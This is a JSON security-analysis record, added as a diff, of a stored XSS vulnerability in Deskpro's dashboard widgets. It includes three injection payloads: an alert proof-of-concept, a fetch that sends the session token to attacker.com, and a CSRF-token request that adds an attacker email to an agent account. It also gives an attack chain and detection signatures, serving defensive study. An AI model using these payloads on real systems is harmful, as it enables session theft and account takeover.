@@ -1,0 +1,130 @@
+{
+  "package_info": {
+    "package_name": "Deskpro",
+    "package_manager": "N/A (proprietary SaaS/on-premise application)",
+    "package_versions": "2020.2.9 (Docker image) and Deskpro Cloud (all affected at time of report)",
+    "why_malicious": "The Deskpro application contains a stored cross-site scripting (XSS) vulnerability that allows attackers to inject and execute arbitrary JavaScript in the context of privileged users (admins and agents). This enables session hijacking, account takeover, and potentially full system compromise by leveraging unsanitized user input rendered in the admin/agent dashboard."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "When an admin or agent visits the Ticket Insights dashboard or any dashboard rendering the Top KB Views widget (runtime, upon page load)",
+        "file_location": "meta.pageTitle property in /portal/api/auth/session request payload (stored in database, rendered in dashboard widgets)",
+        "required_permissions": [
+          "network",
+          "browser DOM access"
+        ]
+      },
+      "code_snippet": "<script>alert(1)</script>",
+      "code_language": "javascript",
+      "code_behavior": "When an admin or agent visits the dashboard, the injected script executes in the browser context, displays an alert box as a proof-of-concept, demonstrating arbitrary JavaScript execution, and confirms the presence of a stored XSS vulnerability.",
+      "malice_analysis": {
+        "why_suspicious": "Execution of arbitrary JavaScript from user-controlled input is a classic indicator of stored XSS, which can be leveraged for more severe attacks such as session hijacking or privilege escalation.",
+        "violated_expectations": "User-supplied data (pageTitle) should be properly sanitized and escaped before being rendered in the DOM. Rendering raw HTML/JS from user input violates secure coding practices and enables XSS.",
+        "similar_legitimate_use": "There is no legitimate use case for rendering executable script tags from user-controlled fields in the dashboard context.",
+        "key_indicators": [
+          "User input rendered unsanitized in DOM",
+          "Presence of <script> tags in user-controlled fields",
+          "Execution of alert() as XSS proof-of-concept"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "When an admin or agent views the dashboard widget (runtime, upon dashboard rendering)",
+        "file_location": "meta.pageTitle property in /portal/api/auth/session request payload (stored in database, rendered in dashboard widgets)",
+        "required_permissions": [
+          "network",
+          "browser DOM access"
+        ]
+      },
+      "code_snippet": "<script>fetch('https://attacker.com/steal?token='+DESKPRO_SESSION_CODE)</script>",
+      "code_language": "javascript",
+      "code_behavior": "When the dashboard is rendered, the injected script accesses the DESKPRO_SESSION_CODE global variable (the session token), initiates a network request to an attacker-controlled domain, and exfiltrates the session token, resulting in session hijacking.",
+      "malice_analysis": {
+        "why_suspicious": "The script exfiltrates sensitive session tokens to an external domain, which is a clear sign of an attempt to hijack user sessions and gain unauthorized access.",
+        "violated_expectations": "Session tokens should never be accessible to or exfiltrated by user-injected scripts. Secure applications prevent exposure of session tokens to the DOM and block outbound requests containing sensitive data.",
+        "similar_legitimate_use": "There is no legitimate reason for user-supplied scripts to access and transmit session tokens to external domains.",
+        "key_indicators": [
+          "Access to global session variable (DESKPRO_SESSION_CODE) in DOM",
+          "Outbound network request to attacker-controlled domain",
+          "Session token included in request parameters"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "When an agent views the dashboard widget (runtime, upon dashboard rendering)",
+        "file_location": "meta.pageTitle property in /portal/api/auth/session request payload (stored in database, rendered in dashboard widgets)",
+        "required_permissions": [
+          "network",
+          "browser DOM access"
+        ]
+      },
+      "code_snippet": "<script>fetch('/agent/users/me/emails', {method:'POST',headers:{'X-CSRF-Token':DP_REQUEST_TOKEN},body:JSON.stringify({email:'attacker@somehost.com'})})</script>",
+      "code_language": "javascript",
+      "code_behavior": "When the agent views the dashboard, the injected script programmatically sends an authenticated POST request using the CSRF token from the DOM to add the attacker's email address to the agent's account, silently modifying account settings without user interaction.",
+      "malice_analysis": {
+        "why_suspicious": "The script performs unauthorized modification of user account data by leveraging the CSRF token, indicating an account takeover attempt via background JavaScript.",
+        "violated_expectations": "Account modifications, such as adding emails, should require explicit user action and confirmation, not be possible through background scripts using DOM-exposed CSRF tokens.",
+        "similar_legitimate_use": "Legitimate account changes require user interaction and explicit confirmation, not silent background requests.",
+        "key_indicators": [
+          "Use of CSRF token (DP_REQUEST_TOKEN) from DOM in background request",
+          "Silent modification of user account data via JavaScript",
+          "No user interaction or confirmation required"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker injects a malicious JavaScript payload into the pageTitle property of the meta object in a /portal/api/auth/session request.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Payload is stored in the Deskpro database and will be rendered in dashboard widgets."
+    },
+    {
+      "step": 2,
+      "action": "Admin or agent opens the Ticket Insights dashboard or any dashboard rendering the Top KB Views widget, triggering execution of the stored script in their browser context.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Arbitrary JavaScript executes in the victim's browser context, enabling further malicious actions."
+    },
+    {
+      "step": 3,
+      "action": "Malicious script exfiltrates session token (admin session hijack) or modifies account settings (agent account takeover) via background requests.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Attacker gains admin or agent privileges, can perform privileged actions, and potentially lock out legitimate users."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "User-supplied data rendered unsanitized in DOM elements of admin/agent dashboards",
+      "Execution of <script> tags from database-stored fields in dashboard widgets",
+      "Outbound network requests from dashboard context to external domains containing session or CSRF tokens",
+      "Silent modification of user account data via background JavaScript without user interaction"
+    ],
+    "file_indicators": [
+      "meta.pageTitle property in /portal/api/auth/session payload containing <script> tags or suspicious JavaScript",
+      "Dashboard widget templates rendering unsanitized user input directly into the DOM"
+    ],
+    "network_indicators": [
+      "Outbound HTTP/HTTPS requests from Deskpro admin/agent dashboard to untrusted or external domains (e.g., attacker.com)",
+      "Requests containing session tokens (DESKPRO_SESSION_CODE) or CSRF tokens (DP_REQUEST_TOKEN) in query parameters or request bodies"
+    ],
+    "how_to_detect": "Monitor user-controlled fields such as meta.pageTitle for embedded <script> tags or suspicious JavaScript patterns. Audit dashboard rendering logic for unsanitized data insertion into the DOM. Detect and alert on outbound network requests from the Deskpro admin/agent dashboard to external domains, especially those containing session or CSRF tokens. Flag background requests that modify user account data without corresponding user interaction or confirmation dialogs."
+  }
+}
